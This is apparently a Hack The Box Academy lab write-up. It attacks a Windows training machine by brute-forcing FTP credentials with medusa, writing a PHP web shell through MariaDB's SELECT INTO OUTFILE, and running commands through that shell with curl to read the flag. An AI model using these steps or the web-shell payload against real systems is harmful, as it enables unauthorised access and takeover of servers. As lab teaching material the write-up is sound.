# Section 17: Attacking Common Services - Easy

Module: 11. Attacking Common Services

---

Add `10.129.203.7 inlanefreight.htb` to `/etc/hosts`
## Emuneration
```bash
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Not valid before: 2022-04-21T19:27:17
|_Not valid after:  2032-04-18T19:27:17
| fingerprint-strings: 
|   GenericLines: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     Command unknown, not supported or not allowed...
|     Command unknown, not supported or not allowed...
|   Help: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     214-The following commands are implemented
|     USER PASS ACCT QUIT PORT RETR
|     STOR DELE RNFR PWD CWD CDUP
|     NOOP TYPE MODE STRU
|     LIST NLST HELP FEAT UTF8 PASV
|     MDTM REST PBSZ PROT OPTS CCC
|     XCRC SIZE MFMT CLNT ABORT
|     HELP command successful
|   NULL: 
|_    220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|_ssl-date: 2026-08-09T01:15:01+00:00; -2m41s from scanner time.
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
| http-title: Welcome to XAMPP
|_Requested resource was http://inlanefreight.htb/dashboard/
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
443/tcp  open  https         Core FTP HTTPS Server
|_http-server-header: Core FTP HTTPS Server
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Not valid before: 2022-04-21T19:27:17
|_Not valid after:  2032-04-18T19:27:17
|_ssl-date: 2026-08-09T01:14:59+00:00; -2m41s from scanner time.
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3306/tcp open  mysql         MariaDB 5.5.5-10.4.24
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.24-MariaDB
|   Thread ID: 10
|   Capabilities flags: 63486
|   Some Capabilities: ConnectWithDatabase, Speaks41ProtocolNew, Support41Auth, SupportsCompression, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, FoundRows, IgnoreSigpipes, SupportsLoadDataLocal, ODBCClient, SupportsTransactions, LongColumnFlag, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: 2*w=gq!K9xt^W{'J"gc=
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-EASY
|   NetBIOS_Domain_Name: WIN-EASY
|   NetBIOS_Computer_Name: WIN-EASY
|   DNS_Domain_Name: WIN-EASY
|   DNS_Computer_Name: WIN-EASY
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-09T01:14:47+00:00
| ssl-cert: Subject: commonName=WIN-EASY
| Not valid before: 2026-08-08T01:10:17
|_Not valid after:  2027-02-07T01:10:17
|_ssl-date: 2026-08-09T01:14:59+00:00; -2m41s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.95%I=7%D=8/8%Time=6A77D4DE%P=x86_64-pc-linux-gnu%r(NULL,
SF:41,"220\x20Core\x20FTP\x20Server\x20Version\x202\.0,\x20build\x20725,\x
SF:2064-bit\x20Unregistered\r\n")%r(GenericLines,AD,"220\x20Core\x20FTP\x2
SF:0Server\x20Version\x202\.0,\x20build\x20725,\x2064-bit\x20Unregistered\
SF:r\n502\x20Command\x20unknown,\x20not\x20supported\x20or\x20not\x20allow
SF:ed\.\.\.\r\n502\x20Command\x20unknown,\x20not\x20supported\x20or\x20not
SF:\x20allowed\.\.\.\r\n")%r(Help,17B,"220\x20Core\x20FTP\x20Server\x20Ver
SF:sion\x202\.0,\x20build\x20725,\x2064-bit\x20Unregistered\r\n214-The\x20
SF:following\x20commands\x20are\x20implemented\r\n\x20\x20\x20\x20\x20USER
SF:\x20\x20PASS\x20\x20ACCT\x20\x20QUIT\x20\x20PORT\x20\x20RETR\r\n\x20\x2
SF:0\x20\x20\x20STOR\x20\x20DELE\x20\x20RNFR\x20\x20PWD\x20\x20\x20CWD\x20
SF:\x20\x20CDUP\r\n\x20\x20\x20\x20\x20MKD\x20\x20\x20RMD\x20\x20\x20NOOP\
SF:x20\x20TYPE\x20\x20MODE\x20\x20STRU\r\n\x20\x20\x20\x20\x20LIST\x20\x20
SF:NLST\x20\x20HELP\x20\x20FEAT\x20\x20UTF8\x20\x20PASV\r\n\x20\x20\x20\x2
SF:0\x20MDTM\x20\x20REST\x20\x20PBSZ\x20\x20PROT\x20\x20OPTS\x20\x20CCC\r\
SF:n\x20\x20\x20\x20\x20XCRC\x20\x20SIZE\x20\x20MFMT\x20\x20CLNT\x20\x20AB
SF:ORT\r\n214\x20\x20HELP\x20command\x20successful\r\n");
Service Info: Host: WIN-EASY; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## FTP
```bash
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-0uxdem4fnk]─[~]
└──╼ [★]$ ftp 10.129.203.7
Connected to 10.129.203.7.
220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
Name (10.129.203.7:root): anonymous
331 password required for anonymous
Password: 
500 PASS: command not understood
ftp: Login failed
ftp> ls
502 Command unknown, not supported or not allowed...
502 Command unknown, not supported or not allowed...
ftp: Can't bind for data connection: Address already in use
ftp> 
```

## SMTP
```bash
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-0uxdem4fnk]─[~]
└──╼ [★]$ smtp-user-enum -M RCPT -U resource-users.list -t 10.129.203.7 -D inlanefreight.htb  
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... resource-users.list
Target count ............. 1
Username count ........... 80
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Sat Aug  8 21:22:14 2026 #########
10.129.203.7: fiona@inlanefreight.htb exists
######## Scan completed at Sat Aug  8 21:22:28 2026 #########
1 results.

80 queries in 14 seconds (5.7 queries / sec)
```

## Brute-force password
```bash
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-0uxdem4fnk]─[~]
└──╼ [★]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2026-08-08 21:23:43 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456 (1 of 14344391 complete)
2026-08-08 21:23:44 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 12345 (2 of 14344391 complete)
2026-08-08 21:23:45 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456789 (3 of 14344391 complete)
2026-08-08 21:23:46 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: password (4 of 14344391 complete)
2026-08-08 21:23:47 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: iloveyou (5 of 14344391 complete)
2026-08-08 21:23:48 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: princess (6 of 14344391 complete)
2026-08-08 21:23:49 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 1234567 (7 of 14344391 complete)
2026-08-08 21:23:50 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: rockyou (8 of 14344391 complete)
2026-08-08 21:23:51 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 12345678 (9 of 14344391 complete)
2026-08-08 21:23:52 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: abc123 (10 of 14344391 complete)
2026-08-08 21:23:53 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: nicole (11 of 14344391 complete)
2026-08-08 21:23:54 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: daniel (12 of 14344391 complete)
2026-08-08 21:23:55 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: babygirl (13 of 14344391 complete)
2026-08-08 21:23:56 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: monkey (14 of 14344391 complete)
2026-08-08 21:23:56 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: lovely (15 of 14344391 complete)
2026-08-08 21:23:57 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: jessica (16 of 14344391 complete)
2026-08-08 21:23:58 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 654321 (17 of 14344391 complete)
2026-08-08 21:23:59 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: michael (18 of 14344391 complete)
2026-08-08 21:24:00 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: ashley (19 of 14344391 complete)
2026-08-08 21:24:01 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: qwerty (20 of 14344391 complete)
2026-08-08 21:24:02 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 111111 (21 of 14344391 complete)
2026-08-08 21:24:03 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: iloveu (22 of 14344391 complete)
2026-08-08 21:24:04 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 000000 (23 of 14344391 complete)
2026-08-08 21:24:05 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: michelle (24 of 14344391 complete)
2026-08-08 21:24:06 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: tigger (25 of 14344391 complete)
2026-08-08 21:24:07 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: sunshine (26 of 14344391 complete)
2026-08-08 21:24:07 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: chocolate (27 of 14344391 complete)
2026-08-08 21:24:08 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: password1 (28 of 14344391 complete)
2026-08-08 21:24:09 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: soccer (29 of 14344391 complete)
2026-08-08 21:24:10 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: anthony (30 of 14344391 complete)
2026-08-08 21:24:11 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: friends (31 of 14344391 complete)
2026-08-08 21:24:12 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: butterfly (32 of 14344391 complete)
2026-08-08 21:24:13 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: purple (33 of 14344391 complete)
2026-08-08 21:24:14 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: angel (34 of 14344391 complete)
2026-08-08 21:24:15 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: jordan (35 of 14344391 complete)
2026-08-08 21:24:16 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: liverpool (36 of 14344391 complete)
2026-08-08 21:24:16 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: justin (37 of 14344391 complete)
2026-08-08 21:24:17 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: loveme (38 of 14344391 complete)
2026-08-08 21:24:18 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: fuckyou (39 of 14344391 complete)
2026-08-08 21:24:19 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123123 (40 of 14344391 complete)
2026-08-08 21:24:20 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: football (41 of 14344391 complete)
2026-08-08 21:24:21 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: secret (42 of 14344391 complete)
2026-08-08 21:24:22 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: andrea (43 of 14344391 complete)
2026-08-08 21:24:23 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: carlos (44 of 14344391 complete)
2026-08-08 21:24:24 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: jennifer (45 of 14344391 complete)
2026-08-08 21:24:25 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: joshua (46 of 14344391 complete)
2026-08-08 21:24:26 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: bubbles (47 of 14344391 complete)
2026-08-08 21:24:26 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 1234567890 (48 of 14344391 complete)
2026-08-08 21:24:27 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: superman (49 of 14344391 complete)
2026-08-08 21:24:28 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: hannah (50 of 14344391 complete)
2026-08-08 21:24:29 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: amanda (51 of 14344391 complete)
2026-08-08 21:24:30 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: loveyou (52 of 14344391 complete)
2026-08-08 21:24:31 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: pretty (53 of 14344391 complete)
2026-08-08 21:24:32 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: basketball (54 of 14344391 complete)
2026-08-08 21:24:33 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: andrew (55 of 14344391 complete)
2026-08-08 21:24:34 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: angels (56 of 14344391 complete)
2026-08-08 21:24:35 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: tweety (57 of 14344391 complete)
2026-08-08 21:24:36 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: flower (58 of 14344391 complete)
2026-08-08 21:24:36 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: playboy (59 of 14344391 complete)
2026-08-08 21:24:37 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: hello (60 of 14344391 complete)
2026-08-08 21:24:38 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: elizabeth (61 of 14344391 complete)
2026-08-08 21:24:39 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: hottie (62 of 14344391 complete)
2026-08-08 21:24:40 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: tinkerbell (63 of 14344391 complete)
2026-08-08 21:24:41 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: charlie (64 of 14344391 complete)
2026-08-08 21:24:42 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: samantha (65 of 14344391 complete)
2026-08-08 21:24:43 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: barbie (66 of 14344391 complete)
2026-08-08 21:24:44 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: chelsea (67 of 14344391 complete)
2026-08-08 21:24:45 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: lovers (68 of 14344391 complete)
2026-08-08 21:24:45 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: teamo (69 of 14344391 complete)
2026-08-08 21:24:46 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: jasmine (70 of 14344391 complete)
2026-08-08 21:24:47 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: brandon (71 of 14344391 complete)
2026-08-08 21:24:48 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 666666 (72 of 14344391 complete)
2026-08-08 21:24:49 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: shadow (73 of 14344391 complete)
2026-08-08 21:24:50 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: melissa (74 of 14344391 complete)
2026-08-08 21:24:51 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: eminem (75 of 14344391 complete)
2026-08-08 21:24:52 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: matthew (76 of 14344391 complete)
2026-08-08 21:24:53 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: robert (77 of 14344391 complete)
2026-08-08 21:24:54 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: danielle (78 of 14344391 complete)
2026-08-08 21:24:55 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: forever (79 of 14344391 complete)
2026-08-08 21:24:55 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: family (80 of 14344391 complete)
2026-08-08 21:24:56 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: jonathan (81 of 14344391 complete)
2026-08-08 21:24:57 ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 987654321 (82 of 14344391 complete)
2026-08-08 21:24:57 ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: 987654321 [SUCCESS]
```

## Access FTP
```bash
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-0uxdem4fnk]─[~]
└──╼ [★]$ ftp 10.129.203.7
Connected to 10.129.203.7.
220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
Name (10.129.203.7:root): fiona
331 password required for fiona
Password: 
230-Logged on
230 
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||42120|)
^C
receive aborted. Waiting for remote to finish abort.
ftp> ls
229 Entering Extended Passive Mode (|||42120|)
ls
^C
receive aborted. Waiting for remote to finish abort.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection
-r-xr-xrwx   1 owner    group              55 Apr 21  2022      docs.txt
-r-xr-xrwx   1 owner    group             255 Apr 22  2022      WebServersInfo.txt
226 Transfer Complete
ftp> get docs.txt
local: docs.txt remote: docs.txt
200 PORT command successful
150 RETR command started
    55       49.18 KiB/s 
226 Transfer Complete
55 bytes received in 00:00 (1.27 KiB/s)
ftp> get WebServersInfo.txt
local: WebServersInfo.txt remote: WebServersInfo.txt
200 PORT command successful
150 RETR command started
   255      491.16 KiB/s 
226 Transfer Complete
255 bytes received in 00:00 (5.90 KiB/s)
ftp> 
```
Read the files:
```bash
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-0uxdem4fnk]─[~]
└──╼ [★]$ cat docs.txt 
I'm testing the FTP using HTTPS, everything looks good.┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-0uxdem4fnk]─[~]
└──╼ [★]$ cat WebServersInfo.txt 
CoreFTP:
Directory C:\CoreFTP
Ports: 21 & 443
Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt

Apache
Directory "C:\xampp\htdocs\"
Ports: 80 & 4443
Test Command: curl http://localhost/test.php┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-0uxdem4fnk]─[~]
└──╼ [★]$
```
Found CoreFTP that relevant to https://nvd.nist.gov/vuln/detail/CVE-2022-22836
## Exploiting
I tried many ways with curl however it still doesn't work so I use the MySQL method:
```bash
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-0uxdem4fnk]─[~]
└──╼ [★]$ mysql -h 10.129.203.7 -u fiona -p987654321 --ssl=FALSE        
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 18
Server version: 10.4.24-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show tables;
ERROR 1046 (3D000): No database selected
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| phpmyadmin         |
| test               |
+--------------------+
5 rows in set (0.184 sec)

MariaDB [(none)]> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:\\xampp\\htdocs\\shell.php';
Query OK, 1 row affected (0.175 sec)
```

## Get the flag
```bash
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-0uxdem4fnk]─[~]
└──╼ [★]$ curl 'http://10.129.203.7/shell.php?c=dir%20C:\'
 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of C:\

04/21/2022  02:27 PM             1,024 .rnd
04/21/2022  02:27 PM    <DIR>          certs
08/08/2026  08:29 PM    <DIR>          CoreFTP
04/21/2022  02:33 PM                 4 filecreated
02/25/2022  11:20 AM    <DIR>          PerfLogs
04/22/2022  10:43 AM    <DIR>          Program Files
04/22/2022  10:43 AM    <DIR>          Program Files (x86)
04/20/2022  08:13 AM    <DIR>          SQL2019
03/19/2022  05:56 AM    <DIR>          Temp
04/25/2022  01:34 PM    <DIR>          Users
04/20/2022  12:48 PM    <DIR>          Windows
04/22/2022  09:36 AM    <DIR>          xampp
               2 File(s)          1,028 bytes
              10 Dir(s)  15,641,174,016 bytes free
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-0uxdem4fnk]─[~]
└──╼ [★]$ curl 'http://10.129.203.7/shell.php?c=dir%20C:\Users'
 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of C:\Users

04/25/2022  01:34 PM    <DIR>          .
04/25/2022  01:34 PM    <DIR>          ..
04/20/2022  05:38 AM    <DIR>          Administrator
04/20/2022  06:03 AM    <DIR>          htb-rdp
04/20/2022  09:05 AM    <DIR>          mssqlsvc
10/06/2021  03:46 PM    <DIR>          Public
04/25/2022  01:33 PM    <DIR>          technicalsupport
               0 File(s)              0 bytes
               7 Dir(s)  15,641,174,016 bytes free
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-0uxdem4fnk]─[~]
└──╼ [★]$ curl 'http://10.129.203.7/shell.php?c=type%20C:\Users\Administrator\flag.txt'
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-0uxdem4fnk]─[~]
└──╼ [★]$ curl 'http://10.129.203.7/shell.php?c=dir%20C:\Users\Administrator'
 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of C:\Users\Administrator

04/20/2022  05:38 AM    <DIR>          .
04/20/2022  05:38 AM    <DIR>          ..
04/20/2022  05:38 AM    <DIR>          3D Objects
04/20/2022  05:38 AM    <DIR>          Contacts
04/22/2022  10:40 AM    <DIR>          Desktop
04/20/2022  12:12 PM    <DIR>          Documents
04/25/2022  01:29 PM    <DIR>          Downloads
04/20/2022  05:38 AM    <DIR>          Favorites
04/20/2022  05:38 AM    <DIR>          Links
04/20/2022  05:38 AM    <DIR>          Music
04/20/2022  05:38 AM    <DIR>          Pictures
04/20/2022  05:38 AM    <DIR>          Saved Games
04/20/2022  05:38 AM    <DIR>          Searches
04/20/2022  05:38 AM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  15,641,108,480 bytes free
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-0uxdem4fnk]─[~]
└──╼ [★]$ curl 'http://10.129.203.7/shell.php?c=dir%20C:\Users\Administrator\Desktop'
 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of C:\Users\Administrator\Desktop

04/22/2022  10:40 AM    <DIR>          .
04/22/2022  10:40 AM    <DIR>          ..
04/22/2022  10:36 AM                39 flag.txt
               1 File(s)             39 bytes
               2 Dir(s)  15,641,108,480 bytes free
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-0uxdem4fnk]─[~]
└──╼ [★]$ curl 'http://10.129.203.7/shell.php?c=type%20C:\Users\Administrator\Desktop\flag.txt'
HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
```

---


[Back to Module Index](./README.md)
